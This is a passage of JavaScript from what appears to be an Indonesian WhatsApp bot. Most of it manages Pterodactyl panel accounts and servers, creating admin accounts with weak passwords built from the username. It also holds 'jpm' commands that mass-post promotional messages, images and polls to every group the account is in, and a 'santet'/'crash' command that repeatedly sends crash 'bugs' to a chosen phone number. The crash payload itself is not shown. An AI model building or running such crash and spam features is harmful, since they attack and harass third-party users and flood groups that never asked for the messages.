let getGroups = await Skyzo.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await Skyzo.sendMessage(jid, {text: teks}, {quoted: qloc})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmhidetag": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await Skyzo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await Skyzo.sendMessage(jid, {text: teks, mentions: getGroups[jid].participants.map(e => e.id)}, {quoted: qchanel})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "tespol": {
if (!isOwner) return m.reply(msg.owner)
if (!isGroup) return m.reply(msg.group)
if (!text) return m.reply(example("teks1|teks2|teks3"))
if (!text.split("|")) return m.reply(example("teks1|teks2|teks3"))
let anu = await text.split("|")
if (anu.length < 3) return m.reply(example("teks1|teks2|teks3"))
Skyzo.sendPoll(m.chat, anu[0], anu.filter(e => e !== anu[0]))
}
break
case "jpmpol": case "jpmpoll": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("teks1|teks2|teks3"))
if (!text.split("|")) return m.reply(example("teks1|teks2|teks3"))
let anu = text.split("|")
if (anu.length < 3) return m.reply(example("teks1|teks2|teks3"))
let total = 0
let getGroups = await Skyzo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Polling* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
Skyzo.sendPoll(jid, anu[0], anu.filter(e => e !== anu[0]))
total += 1
} catch (e) {
console.log(e)
}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return m.reply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let getGroups = await Skyzo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await Skyzo.sendMessage(jid, {text: teks}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm2": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await Skyzo.downloadAndSaveMediaMessage(qmsg)
let total = 0
let getGroups = await Skyzo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Teks & Foto* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
Skyzo.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await Skyzo.downloadAndSaveMediaMessage(qmsg)
if (global.idsaluran == "-") return m.reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let getGroups = await Skyzo.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
m.reply(`Memproses Mengirim Pesan *Teks & Foto* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
Skyzo.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true, forwardedNewsletterMessageInfo: {newsletterJid: global.idsaluran, serverMessageId: 100, 
newsletterName: `Testimoni By ${namaowner}`
}}}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "addadmin": {
if (!text) return m.reply(example("username"))
if (!isOwner) return m.reply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Skyzo.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!args[0]) return m.reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = "*🌐 LIST ADMIN PANEL*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `*┌ ◦* ID User *${i.attributes.id}*
*└ ◦* Nama *${i.attributes.first_name}*\n\n`
})
m.reply(teks)
}
break
case "santet": case "crash": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("6283XX,jumlahbug"))
if (!text.split(",")) return m.reply(example("6283XX,jumlahbug"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return m.reply("Target Tidak Valid!")
if (isNaN(jumlah)) return m.reply("Jumlah Tidak Valid!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await Skyzo.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return m.reply("Target Tidak Terdaftar Di WhatsApp")
m.reply("Memproses Pengiriman Bug . . .")
var total = Number(jumlah) + 10
for (let i = 0; i < total; i++) {
if (i == 10) m.reply(`Berhasil Memproses, Bug Sedang Dikirim Ke ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break
case "cpanel": case "addpanel": case "buatpanel": {
if (!isOwner) return m.reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama"))
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 1GB\",\"title\":\"Ram 1GB\",\"id\":\".cp1gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 2GB\",\"title\":\"Ram 2GB\",\"id\":\".cp2gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 3GB\",\"title\":\"Ram 3GB\",\"id\":\".cp3gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 4GB\",\"title\":\"Ram 4GB\",\"id\":\".cp4gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 5GB\",\"title\":\"Ram 5GB\",\"id\":\".cp5gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 6GB\",\"title\":\"Ram 6GB\",\"id\":\".cp6gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 7GB\",\"title\":\"Ram 7GB\",\"id\":\".cp7gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 8GB\",\"title\":\"Ram 8GB\",\"id\":\".cp8gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 9GB\",\"title\":\"Ram 9GB\",\"id\":\".cp9gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 10GB\",\"title\":\"Ram 10GB\",\"id\":\".cp10gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 11GB\",\"title\":\"Ram 11GB\",\"id\":\".cp11gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 12GB\",\"title\":\"Ram 12GB\",\"id\":\".cp12gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 13GB\",\"title\":\"Ram 13GB\",\"id\":\".cp13gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 14GB\",\"title\":\"Ram 14GB\",\"id\":\".cp14gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 15GB\",\"title\":\"Ram 15GB\",\"id\":\".cp15gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 16GB\",\"title\":\"Ram 16GB\",\"id\":\".cp16gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 17GB\",\"title\":\"Ram 17GB\",\"id\":\".cp17gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 18GB\",\"title\":\"Ram 18GB\",\"id\":\".cp18gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 19GB\",\"title\":\"Ram 19GB\",\"id\":\".cp19gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 20GB\",\"title\":\"Ram 20GB\",\"id\":\".cp20gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 21GB\",\"title\":\"Ram 21GB\",\"id\":\".cp21gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 22GB\",\"title\":\"Ram 22GB\",\"id\":\".cp22gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 23GB\",\"title\":\"Ram 23GB\",\"id\":\".cp23gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 24GB\",\"title\":\"Ram 24GB\",\"id\":\".cp24gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 25GB\",\"title\":\"Ram 25GB\",\"id\":\".cp25gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 26GB\",\"title\":\"Ram 26GB\",\"id\":\".cp26gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 27GB\",\"title\":\"Ram 27GB\",\"id\":\".cp27gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 28GB\",\"title\":\"Ram 28GB\",\"id\":\".cp28gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 29GB\",\"title\":\"Ram 29GB\",\"id\":\".cp29gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 30GB\",\"title\":\"Ram 30GB\",\"id\":\".cp30gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 31GB\",\"title\":\"Ram 31GB\",\"id\":\".cp31gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 32GB\",\"title\":\"Ram 32GB\",\"id\":\".cp32gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 33GB\",\"title\":\"Ram 33GB\",\"id\":\".cp33gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 34GB\",\"title\":\"Ram 34GB\",\"id\":\".cp34gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 35GB\",\"title\":\"Ram 35GB\",\"id\":\".cp35gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 36GB\",\"title\":\"Ram 36GB\",\"id\":\".cp36gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 37GB\",\"title\":\"Ram 37GB\",\"id\":\".cp37gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 38GB\",\"title\":\"Ram 38GB\",\"id\":\".cp38gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 39GB\",\"title\":\"Ram 39GB\",\"id\":\".cp39gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 40GB\",\"title\":\"Ram 40GB\",\"id\":\".cp40gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 41GB\",\"title\":\"Ram 41GB\",\"id\":\".cp41gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 42GB\",\"title\":\"Ram 42GB\",\"id\":\".cp42gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 43GB\",\"title\":\"Ram 43GB\",\"id\":\".cp43gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 44GB\",\"title\":\"Ram 44GB\",\"id\":\".cp44gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 45GB\",\"title\":\"Ram 45GB\",\"id\":\".cp45gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 46GB\",\"title\":\"Ram 46GB\",\"id\":\".cp46gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 47GB\",\"title\":\"Ram 47GB\",\"id\":\".cp47gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 48GB\",\"title\":\"Ram 48GB\",\"id\":\".cp48gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 49GB\",\"title\":\"Ram 49GB\",\"id\":\".cp49gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 50GB\",\"title\":\"Ram 50GB\",\"id\":\".cp50gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram Unlimited\",\"title\":\"Ram Unlimited\",\"id\":\".cpunli\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Skyzo.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cp11gb": case "cp12gb": case "cp13gb": case "cp14gb": case "cp15gb": case "cp16gb": case "cp17gb": case "cp18gb": case "cp19gb": case "cp20gb": case "cp21gb": case "cp22gb": case "cp23gb": case "cp24gb": case "cp25gb": case "cp26gb": case "cp27gb": case "cp28gb": case "cp29gb": case "cp30gb": case "cp31gb": case "cp32gb": case "cp33gb": case "cp34gb": case "cp35gb": case "cp36gb": case "cp37gb": case "cp38gb": case "cp39gb": case "cp40gb": case "cp41gb": case "cp42gb": case "cp43gb": case "cp44gb": case "cp45gb": case "cp46gb": case "cp47gb": case "cp48gb": case "cp49gb": case "cp50gb": case "cpunli": {
if (!isOwner) return m.reply(msg.owner)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1125"
disknya = "1125"
cpu = "30"
} else if (command == "cp2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gb") {
ram = "3125"
disknya = "3125"
cpu = "90"
} else if (command == "cp4gb") {
ram = "4125"
disknya = "4125"
cpu = "120"
} else if (command == "cp5gb") {
ram = "5125"
disknya = "5125"
cpu = "150"
} else if (command == "cp6gb") {
ram = "6125"
disknya = "6125"
cpu = "180"
} else if (command == "cp7gb") {
ram = "7125"
disknya = "7125"
cpu = "210"
} else if (command == "cp8gb") {
ram = "8125"
disknya = "8125"
cpu = "240"
} else if (command == "cp9gb") {
ram = "9124"
disknya = "9125"
cpu = "280"
} else if (command == "cp10gb") {
ram = "10125"
disknya = "10125"
cpu = "320"
} else if (command == "cp11gb") {
ram = "11125"
disknya = "11125"
cpu = "360"
} else if (command == "cp12gb") {
ram = "12125"
disknya = "12125"
cpu = "390"
} else if (command == "cp13gb") {
ram = "13125"
disknya = "13125"
cpu = "420"
} else if (command == "cp14gb") {
ram = "14125"
disknya = "14125"
cpu = "450"
} else if (command == "cp15gb") {
ram = "15125"
disknya = "15125"
cpu = "480"
} else if (command == "cp16gb") {
ram = "16125"
disknya = "16125"
cpu = "510"
} else if (command == "cp17gb") {
ram = "17125"
disknya = "17125"
cpu = "540"
} else if (command == "cp18gb") {
ram = "18125"
disknya = "18125"
cpu = "570"
} else if (command == "cp19gb") {
ram = "19125"
disknya = "19125"
cpu = "600"
} else if (command == "cp20gb") {
ram = "20125"
disknya = "20125"
cpu = "630"
} else if (command == "cp21gb") {
ram = "21125"
disknya = "21125"
cpu = "660"
} else if (command == "cp22gb") {
ram = "22125"
disknya = "22125"
cpu = "660"
} else if (command == "cp23gb") {
ram = "23125"
disknya = "23125"
cpu = "690"
} else if (command == "cp24gb") {
ram = "24125"
disknya = "24125"
cpu = "720"
} else if (command == "cp25gb") {
ram = "25125"
disknya = "25125"
cpu = "750"
} else if (command == "cp26gb") {
ram = "26125"
disknya = "26125"
cpu = "780"
} else if (command == "cp27gb") {
ram = "27125"
disknya = "27125"
cpu = "810"
} else if (command == "cp28gb") {
ram = "28125"
disknya = "28125"
cpu = "840"
} else if (command == "cp29gb") {
ram = "29125"
disknya = "29125"
cpu = "870"
} else if (command == "cp30gb") {
ram = "30125"
disknya = "30125"
cpu = "900"
} else if (command == "cp31gb") {
ram = "31125"
disknya = "31125"
cpu = "930"
} else if (command == "cp32gb") {
ram = "32125"
disknya = "32125"
cpu = "960"
} else if (command == "cp33gb") {
ram = "33125"
disknya = "33125"
cpu = "990"
} else if (command == "cp34gb") {
ram = "34125"
disknya = "34125"
cpu = "1020"
} else if (command == "cp35gb") {
ram = "35125"
disknya = "35125"
cpu = "1050"
} else if (command == "cp36gb") {
ram = "36125"
disknya = "35125"
cpu = "1080"
} else if (command == "cp37gb") {
ram = "37125"
disknya = "37125"
cpu = "1110"
} else if (command == "cp38gb") {
ram = "38125"
disknya = "38125"
cpu = "1240"
} else if (command == "cp39gb") {
ram = "39125"
disknya = "39125"
cpu = "1270"
} else if (command == "cp40gb") {
ram = "40125"
disknya = "40125"
cpu = "1200"
} else if (command == "cp41gb") {
ram = "41125"
disknya = "41125"
cpu = "1230"
} else if (command == "cp42gb") {
ram = "42125"
disknya = "42125"
cpu = "1260"
} else if (command == "cp43gb") {
ram = "43125"
disknya = "43125"
cpu = "1290"
} else if (command == "cp44gb") {
ram = "44125"
disknya = "44125"
cpu = "1320"
} else if (command == "cp45gb") {
ram = "45125"
disknya = "45125"
cpu = "1350"
} else if (command == "cp46gb") {
ram = "46125"
disknya = "46125"
cpu = "1380"
} else if (command == "cp47gb") {
ram = "47125"
disknya = "47125"
cpu = "1410"
} else if (command == "cp48gb") {
ram = "48125"
disknya = "48125"
cpu = "1440"
} else if (command == "cp49gb") {
ram = "49125"
disknya = "49125"
cpu = "1470"
} else if (command == "cp50gb") {
ram = "50125"
disknya = "50125"
cpu = "1500"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner) return m.reply(msg.owner)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Skyzo.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isOwner) return m.reply(msg.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*🌐 LIST SERVER PANEL BOT*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `*┌ ◦* ID Server *${s.id}*\n`;
messageText += `*│ ◦* Nama Server *${s.name}*\n`
messageText += `*│ ◦* Ram *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*\n`
messageText += `*│ ◦* CPU *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*\n`;
messageText += `*└ ◦* Storage *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await Skyzo.sendMessage(m.chat, { text: messageText }, { quoted: m })
}
break
case "delpanel": case "hapuspanel": {
if (!isOwner) return m.reply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break
case "sendpayment": case "payment": case "pay": case "listpayment": {
if (!isOwner) return m.reply(msg.owner)
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Dana Payment\",\"title\":\"Dana\",\"id\":\".danapay\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ovo Payment\",\"title\":\"Ovo\",\"id\":\".ovopay\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Gopay Payment\",\"title\":\"Gopay\",\"id\":\".gopaypay\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"QRIS All Payment\",\"title\":\"QRIS\",\"id\":\".qrispay\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: qdoc}) 
